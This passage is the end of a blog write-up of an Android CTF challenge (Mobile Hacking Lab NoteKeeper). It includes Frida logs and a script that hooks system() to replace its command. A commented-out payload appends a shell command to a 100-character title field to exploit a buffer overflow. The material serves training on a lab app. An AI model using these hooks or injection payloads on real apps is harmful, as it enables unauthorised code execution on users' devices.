+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-25">25</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS E:\Desktop\Android\frida-script&gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js
+</span></span><span style="display:flex;"><span>     ____
+</span></span><span style="display:flex;"><span>    / _  |   Frida <span style="color:#ae81ff">16.5</span>.9 - A world-class dynamic instrumentation toolkit
+</span></span><span style="display:flex;"><span>   | (_| |
+</span></span><span style="display:flex;"><span>    &gt; _  |   Commands<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>   /_/ |_|       help      -&gt; Displays the help system
+</span></span><span style="display:flex;"><span>   . . . .       object?   -&gt; Display information about <span style="color:#e6db74">&#39;object&#39;</span>
+</span></span><span style="display:flex;"><span>   . . . .       exit/quit -&gt; Exit
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   More info at https<span style="color:#960050;background-color:#1e0010">:</span>//frida.re/docs/home/
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
+</span></span><span style="display:flex;"><span>[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-&gt; MainActivity.parse is called<span style="color:#960050;background-color:#1e0010">:</span> Title=qa
+</span></span><span style="display:flex;"><span>[*] system() called with command<span style="color:#960050;background-color:#1e0010">:</span> Log <span style="color:#e6db74">&#34;Note added at </span>$(date)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">9</span>  A  B  C  D  E  F  0123456789ABCDEF
+</span></span><span style="display:flex;"><span>7ff3ad0970  4c <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">22</span> 4e <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">20</span>  Log <span style="color:#e6db74">&#34;Note added
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">7ff3ad0980  61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00  at </span>$(date)<span style="color:#e6db74">&#34;</span>.....
+</span></span><span style="display:flex;"><span>7ff3ad0990  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
+</span></span><span style="display:flex;"><span>[+] Replaced with new command<span style="color:#960050;background-color:#1e0010">:</span> id &gt;&gt; /sdcard/Download/hack2.txt
+</span></span><span style="display:flex;"><span>             <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">9</span>  A  B  C  D  E  F  0123456789ABCDEF
+</span></span><span style="display:flex;"><span>7ff3ad0970  <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">20</span> 3e 3e <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">6f</span>  id &gt;&gt; /sdcard/<span style="color:#66d9ef">Do</span>
+</span></span><span style="display:flex;"><span>7ff3ad0980  <span style="color:#ae81ff">77</span> 6e 6c <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">63</span> 6b <span style="color:#ae81ff">32</span> 2e <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span>  wnload/hack2.txt
+</span></span><span style="display:flex;"><span>7ff3ad0990  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
+</span></span><span style="display:flex;"><span>[*] system() returned with code<span style="color:#960050;background-color:#1e0010">:</span> 0x0
+</span></span><span style="display:flex;"><span>MainActivity.parse result=Qa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here&rsquo;s the result.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-16-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-16-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-16-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-16-2">2</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>beryllium:/sdcard/Download <span style="color:#75715e"># cat hack2.txt</span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10344<span style="color:#f92672">(</span>u0_a344<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10344<span style="color:#f92672">(</span>u0_a344<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10344<span style="color:#f92672">(</span>u0_a344<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20344<span style="color:#f92672">(</span>u0_a344_cache<span style="color:#f92672">)</span>,50344<span style="color:#f92672">(</span>all_a344<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c88,c257,c512,c768
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is another thing that I found interesting and here&rsquo;s the full frida script for this.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-25">25</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-26">26</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-27">27</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-28">28</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-29">29</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-30">30</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-31">31</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-32">32</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-33"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-33">33</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-34"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-34">34</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-35"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-35">35</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-36"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-36">36</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-37"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-37">37</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-17-38"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-17-38">38</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(()=&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MainActivity</span>[<span style="color:#e6db74">&#34;parse&#34;</span>].<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">Title</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// let command = &#34;id &gt;&gt; /sdcard/Download/hack.txt&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// Title = &#34;A&#34;.repeat(100) + command;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse is called: Title=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">Title</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#34;parse&#34;</span>](<span style="color:#a6e22e">Title</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse result=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test2</span>();
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test2</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Interceptor</span>.<span style="color:#a6e22e">attach</span>(<span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">getExportByName</span>(<span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#34;system&#34;</span>), {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">onEnter</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">args</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">readUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() called with command: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">command</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hexdump</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>],{<span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">newCommand</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;id &gt;&gt; /sdcard/Download/hack2.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">writeUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>], <span style="color:#a6e22e">newCommand</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] Replaced with new command:&#34;</span>, <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">readUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]));
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hexdump</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>],{<span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">onLeave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">retval</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() returned with code: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">retval</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="things-i-learned-from-this-challenge">Things I learned from this challenge<a hidden class="anchor" aria-hidden="true" href="#things-i-learned-from-this-challenge">#</a></h2>
+<ul>
+<li>buffer overflow in android</li>
+<li>frida checking function input and output</li>
+<li>hooking <code>system</code> function and rewrite the input by changing it in the stack.</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://callmeks.github.io/tags/mhl/">MHL</a></li>
+      <li><a href="https://callmeks.github.io/tags/android-ctf/">Android CTF</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://callmeks.github.io/posts/my-journey-of-cybersec/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>My Journey of Cybersec</span>
+  </a>
+  <a class="next" href="https://callmeks.github.io/posts/mhl-document-viewer/">
+    <span class="title">Next »</span>
+    <br>
+    <span>MHL Document Viewer</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://callmeks.github.io/">KS Blog</a></span> · 
+
+    <span>
+        Powered by
